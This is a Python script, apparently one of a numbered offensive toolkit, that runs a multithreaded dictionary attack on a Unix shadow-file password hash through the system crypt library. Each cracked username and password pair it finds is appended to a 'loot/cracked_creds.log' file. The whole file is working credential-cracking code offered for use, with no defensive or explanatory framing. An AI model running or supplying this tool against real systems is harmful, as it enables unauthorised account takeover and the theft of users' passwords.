import sys
import os
import ctypes
import ctypes.util
import concurrent.futures

# Link to system C library for crypt(3)
_libcrypt = ctypes.CDLL(ctypes.util.find_library('crypt') or 'libcrypt.so.1')
_libcrypt.crypt.restype = ctypes.c_char_p
_libcrypt.crypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p]

def raw_crypt(word, salt):
    result = _libcrypt.crypt(word.encode('utf-8'), salt.encode('utf-8'))
    return result.decode('utf-8') if result else None

def attempt_crack(target_hash, word, salt):
    if raw_crypt(word, salt) == target_hash:
        return word
    return None

def crack_shadow_entry(shadow_line, wordlist_path, threads=8):
    try:
        parts = shadow_line.strip().split(':')
        user = parts[0]
        target_hash = parts[1]
        
        if not target_hash.startswith('$'):
            print(f"[-] {user}: Hash format not supported.")
            return

        hash_segments = target_hash.split('$')
        salt = f"${hash_segments[1]}${hash_segments[2]}$"
        
        if not os.path.exists(wordlist_path):
            print(f"[-] Wordlist missing: {wordlist_path}")
            return

        with open(wordlist_path, 'r', errors='ignore') as f:
            words = [line.strip() for line in f if line.strip()]

        print(f"[*] Cracking {user} ({len(words)} words) with {threads} threads...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_word = {executor.submit(attempt_crack, target_hash, w, salt): w for w in words}
            
            for future in concurrent.futures.as_completed(future_to_word):
                found_pass = future.result()
                if found_pass:
                    print(f"\n[!!!] SUCCESS: {user}:{found_pass}")
                    with open("../../../loot/cracked_creds.log", "a") as log:
                        log.write(f"{user}:{found_pass}\n")
                    executor.shutdown(wait=False, cancel_futures=True)
                    return

        print(f"[-] No match found for {user}.")
    except Exception as e:
        print(f"[-] Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 144_shadow_crack '<shadow_line>' <wordlist_path> [threads]")
        sys.exit(1)
    t_count = int(sys.argv[3]) if len(sys.argv) > 3 else 8
    crack_shadow_entry(sys.argv[1], sys.argv[2], t_count)
